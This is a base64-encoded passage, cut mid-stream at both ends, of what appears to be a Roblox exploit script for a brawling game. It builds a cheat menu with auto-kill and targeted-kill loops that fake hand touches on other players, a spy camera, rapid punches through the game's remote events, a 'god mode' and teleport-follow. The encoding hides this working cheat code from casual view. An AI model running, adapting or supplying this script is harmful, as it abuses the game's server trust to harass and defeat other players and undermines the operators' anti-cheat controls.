QgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKG5hbWUpDQogICAgICAgICAgICAgICAgaWYgZnJpZW5kIGFuZCBMb2NhbFBsYXllcjpJc0ZyaWVuZHNXaXRoKGZyaWVuZC5Vc2VySWQpIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgcGxheWVyV2hpdGVsaXN0W25hbWVdID0gbmlsDQogICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICBlbmQNCiAgICAgICAgZW5kDQogICAgZW5kDQp9KQ0KDQotLSBBdXRvIEtpbGwgU2VjdGlvbg0KS2lsbHNUYWI6U2VjdGlvbih7VGl0bGUgPSAiQXV0byBLaWxsIn0pDQoNCktpbGxzVGFiOlRvZ2dsZSh7DQogICAgVGl0bGUgPSAiQXV0byBLaWxsIiwNCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkga2lsbCBhbGwgbm9uLXdoaXRlbGlzdGVkIHBsYXllcnMiLA0KICAgIFZhbHVlID0gZmFsc2UsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkNCiAgICAgICAgYXV0b0tpbGwgPSBzdGF0ZQ0KDQogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQ0KICAgICAgICAgICAgd2hpbGUgYXV0b0tpbGwgZG8NCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3IgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpDQogICAgICAgICAgICAgICAgbG9jYWwgcmlnaHRIYW5kID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJSaWdodEhhbmQiKQ0KICAgICAgICAgICAgICAgIGxvY2FsIGxlZnRIYW5kID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpDQoNCiAgICAgICAgICAgICAgICBsb2NhbCBwdW5jaCA9IExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpDQogICAgICAgICAgICAgICAgaWYgcHVuY2ggYW5kIG5vdCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikgdGhlbg0KICAgICAgICAgICAgICAgICAgICBwdW5jaC5QYXJlbnQgPSBjaGFyYWN0ZXINCiAgICAgICAgICAgICAgICBlbmQNCg0KICAgICAgICAgICAgICAgIGlmIHJpZ2h0SGFuZCBhbmQgbGVmdEhhbmQgdGhlbg0KICAgICAgICAgICAgICAgICAgICBmb3IgXywgdGFyZ2V0IGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8NCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldCB+PSBMb2NhbFBsYXllciBhbmQgbm90IHBsYXllcldoaXRlbGlzdFt0YXJnZXQuTmFtZV0gdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldENoYXIgPSB0YXJnZXQuQ2hhcmFjdGVyDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcm9vdFBhcnQgPSB0YXJnZXRDaGFyIGFuZCB0YXJnZXRDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByb290UGFydCB0aGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHJpZ2h0SGFuZCwgcm9vdFBhcnQsIDEpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChsZWZ0SGFuZCwgcm9vdFBhcnQsIDEpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChyaWdodEhhbmQsIHJvb3RQYXJ0LCAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QobGVmdEhhbmQsIHJvb3RQYXJ0LCAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgZW5kDQoNCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wNSkNCiAgICAgICAgICAgIGVuZA0KICAgICAgICBlbmQpDQogICAgZW5kDQp9KQ0KDQotLSBUYXJnZXQgS2lsbCBTZWN0aW9uDQpLaWxsc1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJUYXJnZXQgS2lsbCJ9KQ0KDQpsb2NhbCB0YXJnZXREcm9wZG93biA9IEtpbGxzVGFiOkRyb3Bkb3duKHsNCiAgICBUaXRsZSA9ICJTZWxlY3QgVGFyZ2V0IiwNCiAgICBMaXN0ID0ge30sDQogICAgVmFsdWUgPSAiIiwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKG5hbWUpDQogICAgICAgIGlmIG5hbWUgYW5kIG5vdCB0YWJsZS5maW5kKHRhcmdldFBsYXllck5hbWVzLCBuYW1lKSB0aGVuDQogICAgICAgICAgICB0YWJsZS5pbnNlcnQodGFyZ2V0UGxheWVyTmFtZXMsIG5hbWUpDQogICAgICAgIGVuZA0KICAgIGVuZA0KfSkNCg0KLS0gUG9wdWxhdGUgdGFyZ2V0IGRyb3Bkb3duDQpmb3IgXywgcGxheWVyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8NCiAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbg0KICAgICAgICB0YXJnZXREcm9wZG93bjpBZGQocGxheWVyLk5hbWUpDQogICAgICAgIHRhcmdldERyb3Bkb3duSXRlbXNbcGxheWVyLk5hbWVdID0gdHJ1ZQ0KICAgIGVuZA0KZW5kDQoNClBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpDQogICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIHRoZW4NCiAgICAgICAgdGFyZ2V0RHJvcGRvd246QWRkKHBsYXllci5OYW1lKQ0KICAgICAgICB0YXJnZXREcm9wZG93bkl0ZW1zW3BsYXllci5OYW1lXSA9IHRydWUNCiAgICBlbmQNCmVuZCkNCg0KUGxheWVycy5QbGF5ZXJSZW1vdmluZzpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikNCiAgICBpZiB0YXJnZXREcm9wZG93bkl0ZW1zW3BsYXllci5OYW1lXSB0aGVuDQogICAgICAgIHRhcmdldERyb3Bkb3duSXRlbXNbcGxheWVyLk5hbWVdID0gbmlsDQogICAgICAgIHRhcmdldERyb3Bkb3duOkNsZWFyKCkNCiAgICAgICAgZm9yIG5hbWUgaW4gcGFpcnModGFyZ2V0RHJvcGRvd25JdGVtcykgZG8NCiAgICAgICAgICAgIHRhcmdldERyb3Bkb3duOkFkZChuYW1lKQ0KICAgICAgICBlbmQNCiAgICBlbmQNCg0KICAgIGZvciBpID0gI3RhcmdldFBsYXllck5hbWVzLCAxLCAtMSBkbw0KICAgICAgICBpZiB0YXJnZXRQbGF5ZXJOYW1lc1tpXSA9PSBwbGF5ZXIuTmFtZSB0aGVuDQogICAgICAgICAgICB0YWJsZS5yZW1vdmUodGFyZ2V0UGxheWVyTmFtZXMsIGkpDQogICAgICAgIGVuZA0KICAgIGVuZA0KZW5kKQ0KDQpLaWxsc1RhYjpUZXh0Ym94KHsNCiAgICBUaXRsZSA9ICJSZW1vdmUgVGFyZ2V0IiwNCiAgICBEZXNjID0gIlJlbW92ZSBwbGF5ZXIgZnJvbSB0YXJnZXQgbGlzdCIsDQogICAgUGxhY2Vob2xkZXIgPSAiUGxheWVyIE5hbWUiLA0KICAgIFZhbHVlID0gIiIsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihuYW1lKQ0KICAgICAgICBmb3IgaSwgdiBpbiBpcGFpcnModGFyZ2V0UGxheWVyTmFtZXMpIGRvDQogICAgICAgICAgICBpZiB2ID09IG5hbWUgdGhlbg0KICAgICAgICAgICAgICAgIHRhYmxlLnJlbW92ZSh0YXJnZXRQbGF5ZXJOYW1lcywgaSkNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZW5kDQogICAgICAgIGVuZA0KICAgIGVuZA0KfSkNCg0KS2lsbHNUYWI6VG9nZ2xlKHsNCiAgICBUaXRsZSA9ICJTdGFydCBLaWxsIFRhcmdldCIsDQogICAgRGVzYyA9ICJLaWxsIHNlbGVjdGVkIHRhcmdldHMgb25seSIsDQogICAgVmFsdWUgPSBmYWxzZSwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQ0KICAgICAgICBraWxsVGFyZ2V0ID0gc3RhdGUNCg0KICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkNCiAgICAgICAgICAgIHdoaWxlIGtpbGxUYXJnZXQgZG8NCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3IgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpDQoNCiAgICAgICAgICAgICAgICBsb2NhbCBwdW5jaCA9IExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpDQogICAgICAgICAgICAgICAgaWYgcHVuY2ggYW5kIG5vdCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikgdGhlbg0KICAgICAgICAgICAgICAgICAgICBwdW5jaC5QYXJlbnQgPSBjaGFyYWN0ZXINCiAgICAgICAgICAgICAgICBlbmQNCg0KICAgICAgICAgICAgICAgIGxvY2FsIHJpZ2h0SGFuZCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIlJpZ2h0SGFuZCIsIDUpDQogICAgICAgICAgICAgICAgbG9jYWwgbGVmdEhhbmQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJMZWZ0SGFuZCIsIDUpDQoNCiAgICAgICAgICAgICAgICBpZiByaWdodEhhbmQgYW5kIGxlZnRIYW5kIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIG5hbWUgaW4gaXBhaXJzKHRhcmdldFBsYXllck5hbWVzKSBkbw0KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0ID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZChuYW1lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0IGFuZCB0YXJnZXQgfj0gTG9jYWxQbGF5ZXIgdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHJvb3RQYXJ0ID0gdGFyZ2V0LkNoYXJhY3RlciBhbmQgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcm9vdFBhcnQgdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChyaWdodEhhbmQsIHJvb3RQYXJ0LCAxKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QobGVmdEhhbmQsIHJvb3RQYXJ0LCAxKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QocmlnaHRIYW5kLCByb290UGFydCwgMCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KGxlZnRIYW5kLCByb290UGFydCwgMCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgIGVuZA0KDQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDUpDQogICAgICAgICAgICBlbmQNCiAgICAgICAgZW5kKQ0KICAgIGVuZA0KfSkNCg0KLS0gU3B5IFNlY3Rpb24NCktpbGxzVGFiOlNlY3Rpb24oe1RpdGxlID0gIlNweSJ9KQ0KDQpsb2NhbCBzcHlUYXJnZXREcm9wZG93biA9IEtpbGxzVGFiOkRyb3Bkb3duKHsNCiAgICBUaXRsZSA9ICJTZWxlY3QgVmlldyBUYXJnZXQiLA0KICAgIExpc3QgPSB7fSwNCiAgICBWYWx1ZSA9ICIiLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24obmFtZSkNCiAgICAgICAgdGFyZ2V0UGxheWVyTmFtZSA9IG5hbWUNCiAgICBlbmQNCn0pDQoNCmZvciBfLCBwbGF5ZXIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbw0KICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciB0aGVuDQogICAgICAgIHNweVRhcmdldERyb3Bkb3duOkFkZChwbGF5ZXIuTmFtZSkNCiAgICBlbmQNCmVuZA0KDQpQbGF5ZXJzLlBsYXllckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24ocGxheWVyKQ0KICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciB0aGVuDQogICAgICAgIHNweVRhcmdldERyb3Bkb3duOkFkZChwbGF5ZXIuTmFtZSkNCiAgICBlbmQNCmVuZCkNCg0KUGxheWVycy5QbGF5ZXJSZW1vdmluZzpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikNCiAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbg0KICAgICAgICBzcHlUYXJnZXREcm9wZG93bjpDbGVhcigpDQogICAgICAgIGZvciBfLCBwbHIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbw0KICAgICAgICAgICAgaWYgcGxyIH49IExvY2FsUGxheWVyIHRoZW4NCiAgICAgICAgICAgICAgICBzcHlUYXJnZXREcm9wZG93bjpBZGQocGxyLk5hbWUpDQogICAgICAgICAgICBlbmQNCiAgICAgICAgZW5kDQogICAgZW5kDQplbmQpDQoNCktpbGxzVGFiOlRvZ2dsZSh7DQogICAgVGl0bGUgPSAiVmlldyBQbGF5ZXIiLA0KICAgIERlc2MgPSAiU3BlY3RhdGUgc2VsZWN0ZWQgcGxheWVyIiwNCiAgICBWYWx1ZSA9IGZhbHNlLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpDQogICAgICAgIHNweWluZyA9IHN0YXRlDQogICAgICAgIGlmIG5vdCBzcHlpbmcgdGhlbg0KICAgICAgICAgICAgbG9jYWwgY2FtID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmENCiAgICAgICAgICAgIGNhbS5DYW1lcmFTdWJqZWN0ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgb3IgTG9jYWxQbGF5ZXINCiAgICAgICAgICAgIHJldHVybg0KICAgICAgICBlbmQNCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpDQogICAgICAgICAgICB3aGlsZSBzcHlpbmcgZG8NCiAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXQgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHRhcmdldFBsYXllck5hbWUpDQogICAgICAgICAgICAgICAgaWYgdGFyZ2V0IGFuZCB0YXJnZXQgfj0gTG9jYWxQbGF5ZXIgdGhlbg0KICAgICAgICAgICAgICAgICAgICBsb2NhbCBodW1hbm9pZCA9IHRhcmdldC5DaGFyYWN0ZXIgYW5kIHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikNCiAgICAgICAgICAgICAgICAgICAgaWYgaHVtYW5vaWQgdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IGh1bWFub2lkDQogICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpDQogICAgICAgICAgICBlbmQNCiAgICAgICAgZW5kKQ0KICAgIGVuZA0KfSkNCg0KLS0gQ29tYmF0IFNlY3Rpb24NCktpbGxzVGFiOlNlY3Rpb24oe1RpdGxlID0gIkNvbWJhdCJ9KQ0KDQpLaWxsc1RhYjpUb2dnbGUoew0KICAgIFRpdGxlID0gIkF1dG8gSGl0IE5vIEFuaW0iLA0KICAgIERlc2MgPSAiUmFwaWQgcHVuY2ggd2l0aG91dCBhbmltYXRpb24iLA0KICAgIFZhbHVlID0gZmFsc2UsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkNCiAgICAgICAgYXV0b1B1bmNoTm9BbmltID0gc3RhdGUNCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpDQogICAgICAgICAgICB3aGlsZSBhdXRvUHVuY2hOb0FuaW0gZG8NCiAgICAgICAgICAgICAgICBsb2NhbCBwdW5jaCA9IExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpIG9yIExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpDQogICAgICAgICAgICAgICAgaWYgcHVuY2ggdGhlbg0KICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaC5QYXJlbnQgfj0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgIHB1bmNoLlBhcmVudCA9IExvY2FsUGxheWVyLkNoYXJhY3Rlcg0KICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAicmlnaHRIYW5kIikNCiAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAibGVmdEhhbmQiKQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgYXV0b1B1bmNoTm9BbmltID0gZmFsc2UNCiAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wMSkNCiAgICAgICAgICAgIGVuZA0KICAgICAgICBlbmQpDQogICAgZW5kDQp9KQ0KDQpLaWxsc1RhYjpUb2dnbGUoew0KICAgIFRpdGxlID0gIlF1aWNrIEhpdCIsDQogICAgRGVzYyA9ICJGYXN0IHB1bmNoIHdpdGggbm8gZGVsYXkiLA0KICAgIFZhbHVlID0gZmFsc2UsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkNCiAgICAgICAgX0cuYXV0b1B1bmNoQWN0aXZlID0gc3RhdGUNCiAgICAgICAgaWYgc3RhdGUgdGhlbg0KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpDQogICAgICAgICAgICAgICAgd2hpbGUgX0cuYXV0b1B1bmNoQWN0aXZlIGRvDQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHB1bmNoID0gTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikNCiAgICAgICAgICAgICAgICAgICAgaWYgcHVuY2ggdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgcHVuY2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaDpGaW5kRmlyc3RDaGlsZCgiYXR0YWNrVGltZSIpIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwdW5jaC5hdHRhY2tUaW1lLlZhbHVlID0gMA0KICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQ0KICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgZW5kKQ0KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpDQogICAgICAgICAgICAgICAgd2hpbGUgX0cuYXV0b1B1bmNoQWN0aXZlIGRvDQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHB1bmNoID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikNCiAgICAgICAgICAgICAgICAgICAgaWYgcHVuY2ggdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgcHVuY2g6QWN0aXZhdGUoKQ0KICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkNCiAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIGVuZCkNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQ0KICAgICAgICAgICAgaWYgcHVuY2ggdGhlbg0KICAgICAgICAgICAgICAgIHB1bmNoLlBhcmVudCA9IExvY2FsUGxheWVyLkJhY2twYWNrDQogICAgICAgICAgICBlbmQNCiAgICAgICAgZW5kDQogICAgZW5kDQp9KQ0KDQotLSBHb2QgTW9kZSBTZWN0aW9uDQpLaWxsc1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJHb2QgTW9kZSJ9KQ0KDQpLaWxsc1RhYjpUb2dnbGUoew0KICAgIFRpdGxlID0gIkdvZCBNb2RlIiwNCiAgICBEZXNjID0gIkludmluY2liaWxpdHkgaW4gYnJhd2xzIiwNCiAgICBWYWx1ZSA9IGZhbHNlLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpDQogICAgICAgIGdvZE1vZGVUb2dnbGUgPSBzdGF0ZQ0KICAgICAgICBpZiBzdGF0ZSB0aGVuDQogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkNCiAgICAgICAgICAgICAgICB3aGlsZSBnb2RNb2RlVG9nZ2xlIGRvDQogICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLmJyYXdsRXZlbnQ6RmlyZVNlcnZlcigiam9pbkJyYXdsIikNCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkNCiAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIGVuZCkNCiAgICAgICAgZW5kDQogICAgZW5kDQp9KQ0KDQpLaWxsc1RhYjpUb2dnbGUoew0KICAgIFRpdGxlID0gIkRhbWFnZSBXaXRoIEdvZG1vZGUiLA0KICAgIERlc2MgPSAiRGVhbCBkYW1hZ2Ugd2hpbGUgaW4gZ29kIG1vZGUiLA0KICAgIFZhbHVlID0gZmFsc2UsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkNCiAgICAgICAgZ29kRGFtYWdlQWN0aXZlID0gc3RhdGUNCiAgICAgICAgaWYgc3RhdGUgdGhlbg0KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpDQogICAgICAgICAgICAgICAgd2hpbGUgZ29kRGFtYWdlQWN0aXZlIGRvDQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcg0KICAgICAgICAgICAgICAgICAgICBsb2NhbCBncm91bmRTbGFtID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJHcm91bmQgU2xhbSIpIG9yIChwbGF5ZXIuQ2hhcmFjdGVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJHcm91bmQgU2xhbSIpKQ0KDQogICAgICAgICAgICAgICAgICAgIGlmIGdyb3VuZFNsYW0gdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ3JvdW5kU2xhbS5QYXJlbnQgPT0gcGxheWVyLkJhY2twYWNrIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBncm91bmRTbGFtLlBhcmVudCA9IHBsYXllci5DaGFyYWN0ZXINCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBncm91bmRTbGFtOkZpbmRGaXJzdENoaWxkKCJhdHRhY2tUaW1lIikgdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdyb3VuZFNsYW0uYXR0YWNrVGltZS5WYWx1ZSA9IDANCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KDQogICAgICAgICAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigic2xhbSIpDQogICAgICAgICAgICAgICAgICAgICAgICBncm91bmRTbGFtOkFjdGl2YXRlKCkNCiAgICAgICAgICAgICAgICAgICAgZW5kDQoNCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkgDQogICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICBlbmQpDQogICAgICAgIGVuZA0KICAgIGVuZA0KfSkNCg0KLS0gRm9sbG93IFNlY3Rpb24NCktpbGxzVGFiOlNlY3Rpb24oe1RpdGxlID0gIkZvbGxvdyJ9KQ0KDQpsb2NhbCBmb2xsb3dEcm9wZG93biA9IEtpbGxzVGFiOkRyb3Bkb3duKHsNCiAgICBUaXRsZSA9ICJGb2xsb3cgUGxheWVyIChUUCkiLA0KICAgIExpc3QgPSB7fSwNCiAgICBWYWx1ZSA9ICIiLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc2VsZWN0ZWQpDQogICAgICAgIGlmIHNlbGVjdGVkIGFuZCBzZWxlY3RlZCB+PSAiIiB0aGVuDQogICAgICAgICAgICBsb2NhbCB0YXJnZXQgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHNlbGVjdGVkKQ0KICAgICAgICAgICAgaWYgdGFyZ2V0IHRoZW4NCiAgICAgICAgICAgICAgICBmb2xsb3dUYXJnZXQgPSB0YXJnZXQuTmFtZQ0KICAgICAgICAgICAgICAgIGZvbGxvd2luZyA9IHRydWUNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAtLSBJbW1lZGlhdGUgVFAgd2hlbiBzZWxlY3RlZA0KICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIGZvbGxvd1BsYXllcih0YXJnZXRQbGF5ZXIpDQogICAgICAgICAgICAgICAgICAgIGxvY2FsIG15Q2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3Rlcg0KICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRDaGFyID0gdGFyZ2V0UGxheWVyLkNoYXJhY3Rlcg0KDQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCAobXlDaGFyIGFuZCB0YXJnZXRDaGFyKSB0aGVuIHJldHVybiBlbmQNCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgbXlIUlAgPSBteUNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQ0KICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRIUlAgPSB0YXJnZXRDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikNCg0KICAgICAgICAgICAgICAgICAgICBpZiBteUhSUCBhbmQgdGFyZ2V0SFJQIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGZvbGxvd1BvcyA9IHRhcmdldEhSUC5Qb3NpdGlvbiAtICh0YXJnZXRIUlAuQ0ZyYW1lLkxvb2tWZWN0b3IgKiAzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgbXlIUlAuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhmb2xsb3dQb3MsIHRhcmdldEhSUC5Qb3NpdGlvbikNCiAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgZm9sbG93UGxheWVyKHRhcmdldCkNCiAgICAgICAgICAgIGVuZA0KICAgICAgICBlbmQNCiAgICBlbmQNCn0pDQoNCi0tIFBvcHVsYXRlIGZvbGxvdyBkcm9wZG93bg0KZm9yIF8sIHBsYXllciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvDQogICAgaWYgcGxhe